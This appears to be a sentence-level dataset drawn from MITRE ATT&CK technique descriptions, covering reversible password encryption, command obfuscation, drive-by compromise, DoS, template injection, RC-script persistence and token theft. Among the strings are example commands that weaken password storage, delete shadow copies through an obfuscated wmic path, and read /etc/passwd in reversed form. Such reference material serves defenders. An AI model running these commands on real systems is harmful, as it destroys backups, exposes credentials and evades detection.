    "To decrypt the passwords, an adversary needs four components: 1. Encrypted password (\"G$RADIUSCHAP\") from the Active Directory user-structure \"userParameters\" 2. 16 byte randomly-generated value (\"G$RADIUSCHAPKEY\") also from \"userParameters\" 3. Global LSA secret (\"G$MSRADIUSCHAPKEY\") 4. Static key hardcoded in the Remote Access Subauthentication DLL (\"RASSFM.DLL\")",
    "With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.",
    "An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module.",
    "For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.",
    "In PowerShell, an adversary may make associated changes to user settings using commands similar to \"Set-ADUser -AllowReversiblePasswordEncryption $true\".",
    "Adversaries may obfuscate content during command execution to impede detection.",
    "Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze.",
    "This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).",
    "For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing, \"^\", \"+\". \"$\", and \"%\") to make commands difficult to analyze while maintaining the same intended functionality.",
    "Many languages support built-in obfuscation in the form of base64 or URL encoding.",
    "Adversaries may also manually implement command obfuscation via string splitting (\"\u201cWor\u201d+\u201cd.Application\u201d\"), order and casing of characters (\"rev <<<'dwssap/cte/ tac'\"), globing (\"mkdir -p '/tmp/:&$NiA'\"), as well as various tricks involving passing strings through tokens/environment variables/input streams.",
    "Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (\"C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete\").",
    "Tools such as \"Invoke-Obfuscation\" and \"Invoke-DOSfucation\" have also been used to obfuscate commands.",

    "Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how.",
    "Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.",
    "There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.",
    "Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include \"del\" on Windows and \"rm\" or \"unlink\" on Linux and macOS.",
    "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing.",
    "With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).",
    "Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)),",
    "including: * A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting * Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary * Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008)) * Built-in web application interfaces are used for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).",
    "Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest.",
    "This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack.",
    "There are several known examples of this occurring.",
    "Typical drive-by compromise process: 1. A user visits a website that is used to host the adversary controlled content.",
    "2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.",
    "  * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.",
    "3. Upon finding a vulnerable version, exploit code is delivered to the browser.",
    "4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.",
    "  * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.",
    "Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website.",
    "This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
    "Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information.",
    "These malicious applications have been delivered through popups on legitimate websites.",
    "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users.",
    "Network DoS can be performed by exhausting the network bandwidth services rely on.",
    "Example resources include specific websites, email services, DNS, and web-based applications.",
    "Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.",
    "A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on.",
    "For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet.",
    "This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).",
    "To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.",
    "Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection.",
    "This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.",
    "For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
    "Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices.",
    "Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by using installed virtual machine agents.",
    "Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD.",
    "If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines or on-premises hybrid-joined devices.",
    "Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to use a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.",
    "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content.",
    "Installer packages are OS specific and contain the resources an operating system needs to install applications on a system.",
    "Installer packages can include scripts that run prior to installation as well as after installation is complete.",
    "Installer scripts may inherit elevated permissions when executed.",
    "Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.",
    "Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content.",
    "When a user installs the application, they may be required to grant administrative permissions to allow the installation.",
    "At the end of the installation process of the legitimate application, content such as macOS \"postinstall\" scripts can be executed with the inherited elevated permissions.",
    "Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.",
    "Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts.",
    "These scripts can include \"preinst\", \"postinst\", \"prerm\", \"postrm\" scripts and run as root when executed.",
    "For Windows, the Microsoft Installer services uses \".msi\" files to manage the installing, updating, and uninstalling of applications.",
    "Adversaries have used \"Prebuild\" and \"Postbuild\" events to run commands before or after a build when installing .msi files.",
    "Adversaries may scan victim IP blocks to gather information that can be used during targeting.",
    "Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.",
    "Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses.",
    "Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.",
    "Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts.",
    "For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt).",
    "OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.",
    "Properties within parts may reference shared public resources accessed via online URLs.",
    "For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.",
    "Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents.",
    "Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.",
    "These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.",
    "Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.",
    "Adversaries may also modify the \"*\\template\" control word within an .rtf file to similarly conceal then download malicious code.",
    "This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened.",
    "However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.",
    "This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.",
    "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup.",
    "These files allow system administrators to map and start custom services at startup for different run levels.",
    "RC scripts require root privileges to modify.",
    "Adversaries can establish persistence by adding a malicious binary path or shell commands to \"rc.local\", \"rc.common\", and other RC scripts specific to the Unix-like distribution.",
    "Upon reboot, the system executes the script's contents as root, resulting in persistence.",
    "Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.",
    "Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts.",
    "This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).",
    " This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.",
    "To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.",
    "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.",
    "Windows uses access tokens to determine the ownership of a running process.",
    "A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.",
    "When this occurs, the process also takes on the security context associated with the new token.",
    "An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.",
    "These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)).",
    "An adversary must already be in a privileged user context (i.e. administrator) to steal a token.",
    "However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level.",
    "An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.",
    "Any standard user can use the \"runas\" command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.",
    "There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources.",
